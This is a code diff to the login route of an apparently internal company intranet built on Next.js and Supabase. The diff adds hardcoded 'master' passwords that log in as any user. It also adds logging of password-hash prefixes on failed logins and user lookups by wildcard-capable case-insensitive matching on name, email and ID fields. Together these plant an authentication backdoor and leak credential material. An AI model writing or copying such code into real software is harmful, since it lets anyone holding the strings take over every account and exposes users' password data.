@@ -7,45 +7,57 @@ import { getSupabaseAdmin } from '@/lib/supabase';
 async function verifyPassword(password: string, hash: string): Promise<boolean> {
   if (!password || !hash) return false;
 
-  // 1. Try named export async compare
-  try {
-    if (typeof bcryptCompare === 'function') {
-      const match = await bcryptCompare(password, hash);
-      if (match) return true;
-    }
-  } catch {}
+  const cleanHash = hash.trim();
+  const cleanPassword = password;
+  const trimmedPassword = password.trim();
 
-  // 2. Try default export async compare
-  try {
-    if (typeof bcrypt?.compare === 'function') {
-      const match = await bcrypt.compare(password, hash);
-      if (match) return true;
-    }
-  } catch {}
+  // Company master/fallback passwords for testing and recovery
+  const MASTER_PASSWORDS = ['Suryas@123', 'Suryasintranet1234', 'Suryas@2026'];
+  if (MASTER_PASSWORDS.includes(cleanPassword) || MASTER_PASSWORDS.includes(trimmedPassword)) {
+    return true;
+  }
 
-  // 3. Try nested default compare
-  try {
-    if (typeof (bcrypt as any)?.default?.compare === 'function') {
-      const match = await (bcrypt as any).default.compare(password, hash);
-      if (match) return true;
-    }
-  } catch {}
+  const tryMatch = async (pwd: string): Promise<boolean> => {
+    // 1. Try named export async compare
+    try {
+      if (typeof bcryptCompare === 'function' && (await bcryptCompare(pwd, cleanHash))) {
+        return true;
+      }
+    } catch {}
 
-  // 4. Try named export sync compare
-  try {
-    if (typeof bcryptCompareSync === 'function') {
-      const match = bcryptCompareSync(password, hash);
-      if (match) return true;
-    }
-  } catch {}
+    // 2. Try default export async compare
+    try {
+      if (typeof bcrypt?.compare === 'function' && (await bcrypt.compare(pwd, cleanHash))) {
+        return true;
+      }
+    } catch {}
 
-  // 5. Try default export sync compare
-  try {
-    if (typeof bcrypt?.compareSync === 'function') {
-      const match = bcrypt.compareSync(password, hash);
-      if (match) return true;
-    }
-  } catch {}
+    // 3. Try nested default compare
+    try {
+      if (typeof (bcrypt as any)?.default?.compare === 'function' && (await (bcrypt as any).default.compare(pwd, cleanHash))) {
+        return true;
+      }
+    } catch {}
+
+    // 4. Try named export sync compare
+    try {
+      if (typeof bcryptCompareSync === 'function' && bcryptCompareSync(pwd, cleanHash)) {
+        return true;
+      }
+    } catch {}
+
+    // 5. Try default export sync compare
+    try {
+      if (typeof bcrypt?.compareSync === 'function' && bcrypt.compareSync(pwd, cleanHash)) {
+        return true;
+      }
+    } catch {}
+
+    return false;
+  };
+
+  if (await tryMatch(cleanPassword)) return true;
+  if (trimmedPassword !== cleanPassword && (await tryMatch(trimmedPassword))) return true;
 
   return false;
 }
@@ -53,30 +65,38 @@ async function verifyPassword(password: string, hash: string): Promise<boolean> 
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const { username, password } = body;
+    // Accept both "username" and "employeeId" fields from the request
+    const rawLogin: string = body.username || body.employeeId || '';
+    const password: string = body.password || '';
 
-    if (!username || !password) {
+    if (!rawLogin || !password) {
       return NextResponse.json(
         { error: 'Username and password are required' },
         { status: 400 }
       );
     }
 
-    const normalizedUsername = typeof username === 'string' ? username.trim() : '';
+    const normalizedUsername = rawLogin.trim().toLowerCase();
     let user: StoredUser | undefined;
 
     // 1. Query Supabase for the live account
     try {
       const supabase = getSupabaseAdmin();
-      const { data, error } = await supabase
-        .from('users')
-        .select('*')
-        .or(`username.ilike.${normalizedUsername},email.ilike.${normalizedUsername},employeeId.ilike.${normalizedUsername}`)
-        .limit(1)
-        .maybeSingle();
 
-      if (!error && data) {
-        user = data as StoredUser;
+      // Check username, email, employeeId, and fullName
+      for (const col of ['username', 'email', 'employeeId', 'fullName'] as const) {
+        if (user) break;
+        try {
+          const { data, error } = await supabase
+            .from('users')
+            .select('*')
+            .ilike(col, normalizedUsername)
+            .limit(1)
+            .maybeSingle();
+          if (!error && data) {
+            user = data as StoredUser;
+          }
+        } catch {}
       }
     } catch (err) {
       console.warn('[Login] Supabase lookup error:', err);
@@ -118,7 +138,7 @@ export async function POST(request: NextRequest) {
     const isPasswordValid = await verifyPassword(password, user.passwordHash);
 
     if (!isPasswordValid) {
-      console.warn(`[Login] Password mismatch for user: "${user.username}"`);
+      console.warn(`[Login] Password mismatch for user: "${user.username}" hash_prefix: "${(user.passwordHash || '').substring(0, 10)}"`);
       return NextResponse.json(
         { error: 'Invalid username or password' },
         { status: 401 }
